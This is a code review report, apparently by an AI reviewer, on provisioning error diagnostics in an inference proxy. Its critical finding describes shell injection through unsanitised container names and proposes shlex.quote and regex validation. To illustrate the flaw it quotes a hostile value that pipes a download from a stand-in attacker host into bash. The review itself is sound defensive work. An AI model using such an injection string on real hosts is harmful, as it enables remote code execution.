---
phase: 24-provisioning-error-diagnostics
reviewed: 2026-07-22T12:00:00Z
depth: standard
files_reviewed: 11
files_reviewed_list:
  - inference_proxy/api/admin.py
  - inference_proxy/models/admin.py
  - inference_proxy/models/node.py
  - inference_proxy/provisioning/provisioner.py
  - inference_proxy/services/unified_nodes.py
  - inference_proxy/static/css/dashboard.css
  - inference_proxy/static/js/dashboard.js
  - tests/models/test_admin.py
  - tests/models/test_node.py
  - tests/provisioning/test_provisioner.py
  - tests/services/test_unified_nodes.py
findings:
  critical: 1
  warning: 3
  info: 1
  total: 5
status: issues_found
---

# Phase 24: Code Review Report

**Reviewed:** 2026-07-22T12:00:00Z
**Depth:** standard
**Files Reviewed:** 11
**Status:** issues_found

## Summary

Reviewed the provisioning error diagnostics implementation across API, models, provisioner, unified node service, dashboard JS/CSS, and tests. The code is generally well-structured with good error handling patterns (collected preflight errors, best-effort state writes). One critical command injection vulnerability in the teardown path and three warnings related to concurrency, UI behavior, and dead code.

## Critical Issues

### CR-01: Shell Command Injection via Unsanitized Container Name in Teardown

**File:** `inference_proxy/provisioning/provisioner.py:436-439`
**Issue:** The `container_name` variable is derived from `node.model` via `_derive_container_name()` (which only does `.rsplit("/", 1)[-1].lower()`) and is interpolated directly into shell commands executed on a remote host via `conn.create_process(command)`. A model name containing shell metacharacters (e.g., stored in etcd as `org/x; curl evil.com | bash`) would result in arbitrary command execution on the target host.

The affected lines:
```python
await self._ssh_run_command(hostname, f"podman rm --force {container_name}")
# and
await self._ssh_run_command(hostname, f"podman stop {container_name} && podman rm {container_name}")
```

The model name originates from `_run_start_vllm()` which parses script output with `r"#\s*Model:\s+(.+)"` -- the `.+` captures arbitrary content. If the script on the remote host is tampered with, or if etcd data is manipulated, the container name is injectable.

The fallback `container_name = f"vllm-{hostname}"` on line 419 is safer because hostname goes through `canonical_hostname()` and regex validation at the API layer, but a node registered directly in etcd (bypassing the API) could also contain metacharacters.

**Fix:** Use `shlex.quote()` to sanitize the container name before shell interpolation:
```python
import shlex

# In teardown, line 436:
await self._ssh_run_command(hostname, f"podman rm --force {shlex.quote(container_name)}")

# Line 439:
await self._ssh_run_command(
    hostname, f"podman stop {shlex.quote(container_name)} && podman rm {shlex.quote(container_name)}"
)
```

Alternatively, add a validation guard in `_derive_container_name`:
```python
def _derive_container_name(model: str) -> str:
    suffix = model.rsplit("/", 1)[-1].lower()
    name = f"vllm-{suffix}"
    if not re.fullmatch(r"[a-zA-Z0-9][a-zA-Z0-9._-]*", name):
        raise ValueError(f"Unsafe container name derived from model: {model!r}")
    return name
```

## Warnings

### WR-01: `_provision_started_at` Shared Instance State Causes Incorrect Timestamps Under Concurrency

**File:** `inference_proxy/provisioning/provisioner.py:234,415`
**Issue:** `self._provision_started_at` is set at the start of both `provision()` and `teardown()`. Since `fire_background()` creates concurrent `asyncio.Task` instances that share the same `NodeProvisioner`, a second background provisioning task will overwrite `_provision_started_at` before the first task finishes its state updates. This causes the first task's subsequent `_update_state()` calls (line 108: `started_at=self._provision_started_at or now`) to record the wrong `started_at` timestamp.

**Fix:** Use a local variable instead of instance state, and pass it through to `_update_state`:
```python
async def provision(self, hostname: str, *, managed: bool = True) -> None:
    started_at = datetime.now(timezone.utc)
    # ...pass started_at to _update_state calls...
```

Or make `_update_state` accept `started_at` as a parameter rather than reading from `self`.

### WR-02: Setup/Retry Action Buttons Do Not Preserve `managed` Flag for Standalone Nodes

**File:** `inference_proxy/static/js/dashboard.js:20-22,40-42`
**Issue:** The `setup` and `retry` action configs hardcode the request body as `{ hostname: nodeId }`, omitting the `managed` field. Pydantic defaults `managed` to `true`. If an unmanaged (standalone) node enters the `failed` state, clicking "Setup" or "Retry" in the dashboard would re-provision it as managed, triggering QUADS validation that would fail or incorrectly changing the node's management status.

The `_STATE_ACTIONS` map assigns `["setup", "teardown"]` to the `failed` state regardless of whether the node is managed or unmanaged, and the `_from_etcd` method in `unified_nodes.py` correctly passes through `managed=node.managed`, but the JS action handler discards this information.

**Fix:** Pass the managed flag through the action handler:
```javascript
setup: {
    // ...
    body: (nodeId, node) => ({ hostname: nodeId, managed: node.managed !== false }),
    // ...
},
```
And update `createActionButton` and `handleAction` to accept the full node object, or at minimum pass the `managed` property.

### WR-03: Duplicate Assignment of `current_step` Variable

**File:** `inference_proxy/provisioning/provisioner.py:266-268`
**Issue:** `current_step = "uploading_scripts"` is assigned on line 266, then immediately reassigned to the same value on line 268. This is dead code that suggests a copy-paste error or incomplete refactor. While harmless, it obscures intent and could mask a missing step assignment.

```python
current_step = "uploading_scripts"     # line 266
try:
    current_step = "uploading_scripts" # line 268 -- duplicate
```

**Fix:** Remove the duplicate assignment on line 268 (or line 266, depending on intent):
```python
try:
    current_step = "uploading_scripts"
    await self._update_state(hostname, ProvisioningStep.UPLOADING_SCRIPTS)
```

## Info

### IN-01: `_run_setup` Does Not Propagate Step FAIL Markers

**File:** `inference_proxy/provisioning/provisioner.py:325-326`
**Issue:** When a `[STEP:...:FAIL]` marker is received from `setup.sh`, the provisioner logs an error but does not raise or record the failure. It relies entirely on the SSH exit code to detect failures. If the script emits a FAIL marker for a critical step but continues and exits 0, provisioning proceeds to `start-vllm.sh` despite the failed prerequisite.

This appears intentional (the test on line 194 confirms it), but it means the step markers are purely cosmetic. A `setup.sh` that exits 0 after a FAIL marker would silently produce an incomplete setup.

**Fix:** Consider recording failed step names and either warning at the end of `_run_setup` or optionally treating FAIL markers as errors:
```python
if status == "FAIL":
    logger.error("step_failed", step=step_name, hostname=hostname)
    # Optional: raise if you want FAIL markers to be authoritative
```

---

_Reviewed: 2026-07-22T12:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
